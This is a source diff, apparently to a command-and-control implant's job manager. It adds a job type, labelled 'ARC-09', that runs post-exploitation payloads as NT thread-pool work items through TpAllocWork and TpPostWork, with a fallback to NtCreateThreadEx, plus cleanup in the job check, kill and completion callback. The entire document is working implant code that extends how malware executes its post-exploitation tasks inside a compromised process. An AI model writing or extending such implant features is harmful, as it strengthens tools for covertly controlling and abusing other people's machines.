@@ -4,6 +4,7 @@
 #include <core/Package.h>
 #include <core/MiniStd.h>
 #include <core/ObjectApi.h>
+#include <core/Thread.h>
 
 /*!
  * JobAdd
@@ -96,6 +97,15 @@ VOID JobCheckList()
                         JobList->State = JOB_STATE_DEAD;
                 }
 
+                break;
+            }
+
+            /* ARC-09: threadpool work items have no thread handle to query.
+             * The wrapper callback marks the job dead on completion.
+             * No action needed here — dead entries are harmless and are
+             * cleaned up by JobKill or when the next job reuses the slot. */
+            case JOB_TYPE_THREADPOOL:
+            {
                 break;
             }
 
@@ -330,6 +340,14 @@ BOOL JobKill( DWORD JobID )
                     break;
                 }
 
+                /* ARC-09: threadpool work items cannot be terminated mid-flight.
+                 * Mark as dead so the next JobCheckList sweep cleans it up. */
+                case JOB_TYPE_THREADPOOL:
+                {
+                    JobList->State = JOB_STATE_DEAD;
+                    break;
+                }
+
                 case JOB_TYPE_TRACK_PROCESS:
                 {
                     if ( JobList->State != JOB_STATE_DEAD )
@@ -428,4 +446,116 @@ VOID JobRemove( DWORD JobID )
     MemSet( JobToRemove, 0, sizeof( JOB_DATA ) );
     Instance->Win32.LocalFree( JobToRemove );
     JobToRemove = NULL;
+}
+
+/* ------------------------------------------------------------------
+ * ARC-09: NT thread-pool execution for post-ex jobs
+ * ------------------------------------------------------------------ */
+
+/*!
+ * Context block passed from JobSubmitThreadPool to the TP callback wrapper.
+ * Carries the original LPTHREAD_START_ROUTINE entry point, its argument,
+ * the opaque PTP_WORK handle (for release), and the job ID so the wrapper
+ * can mark the job dead on completion.
+ */
+typedef struct _TP_JOB_CTX
+{
+    PVOID  Entry;     /* original callback (LPTHREAD_START_ROUTINE) */
+    PVOID  Arg;       /* original argument */
+    PVOID  TpWork;    /* opaque PTP_WORK handle */
+    DWORD  JobID;     /* tracked job ID */
+} TP_JOB_CTX, *PTP_JOB_CTX;
+
+/*!
+ * TpJobCallback
+ * Wrapper with the PTP_WORK_CALLBACK signature that forwards to the
+ * original LPTHREAD_START_ROUTINE, then marks the job dead and releases
+ * the work object.
+ */
+static VOID NTAPI TpJobCallback( PVOID Instance_, PVOID Context, PVOID Work )
+{
+    PTP_JOB_CTX Ctx = (PTP_JOB_CTX) Context;
+
+    if ( Ctx && Ctx->Entry )
+    {
+        /* call the original entry point with its argument */
+        ( (LPTHREAD_START_ROUTINE) Ctx->Entry )( Ctx->Arg );
+    }
+
+    /* mark the tracked job as dead so JobCheckList cleans it up */
+    PJOB_DATA JobList = Instance->Jobs;
+    while ( JobList )
+    {
+        if ( JobList->JobID == Ctx->JobID )
+        {
+            JobList->State = JOB_STATE_DEAD;
+            break;
+        }
+        JobList = JobList->Next;
+    }
+
+    /* release the TP_WORK object */
+    if ( Instance->Win32.TpReleaseWork && Ctx->TpWork )
+        Instance->Win32.TpReleaseWork( Ctx->TpWork );
+
+    /* decrement thread counter (mirrors the ++ in CoffeeRunner) */
+    Instance->Threads--;
+
+    /* free the context block */
+    MemSet( Ctx, 0, sizeof( TP_JOB_CTX ) );
+    Instance->Win32.LocalFree( Ctx );
+}
+
+/*!
+ * JobSubmitThreadPool
+ * Queue a work item onto the NT thread pool via TpAllocWork / TpPostWork.
+ * Falls back to a plain ThreadCreate when the TP APIs are unavailable.
+ *
+ * @param Entry  Worker callback (LPTHREAD_START_ROUTINE signature)
+ * @param Arg    Opaque context forwarded to Entry
+ * @return TRUE on success
+ */
+BOOL JobSubmitThreadPool( PVOID Entry, PVOID Arg )
+{
+    /* If the TP functions were not resolved, fall back to a plain thread */
+    if ( ! Instance->Win32.TpAllocWork || ! Instance->Win32.TpPostWork )
+    {
+        PUTS( "[ARC-09] TpAllocWork unavailable - falling back to ThreadCreate" )
+        HANDLE hThread = ThreadCreate( THREAD_METHOD_NTCREATEHREADEX, NtCurrentProcess(),
+#if _WIN64
+            TRUE,
+#else
+            FALSE,
+#endif
+            Entry, Arg, NULL );
+        return hThread != NULL;
+    }
+
+    /* Allocate the wrapper context */
+    PTP_JOB_CTX Ctx = Instance->Win32.LocalAlloc( LPTR, sizeof( TP_JOB_CTX ) );
+    if ( ! Ctx )
+        return FALSE;
+
+    Ctx->Entry = Entry;
+    Ctx->Arg   = Arg;
+    Ctx->JobID = RandomNumber32();
+
+    /* Allocate the TP_WORK object — NULL CallbackEnviron = default pool */
+    NTSTATUS Status = Instance->Win32.TpAllocWork( &Ctx->TpWork, TpJobCallback, Ctx, NULL );
+    if ( Status != 0 )
+    {
+        PRINTF( "[ARC-09] TpAllocWork failed: 0x%08x\n", Status )
+        Instance->Win32.LocalFree( Ctx );
+        return FALSE;
+    }
+
+    /* Track as a threadpool job */
+    JobAdd( Instance->CurrentRequestID, Ctx->JobID, JOB_TYPE_THREADPOOL, JOB_STATE_RUNNING, NULL, Ctx );
+
+    /* Submit to the pool — this returns immediately */
+    Instance->Win32.TpPostWork( Ctx->TpWork );
+
+    PRINTF( "[ARC-09] Submitted work item JobID:%d to NT thread pool\n", Ctx->JobID )
+
+    return TRUE;
 }
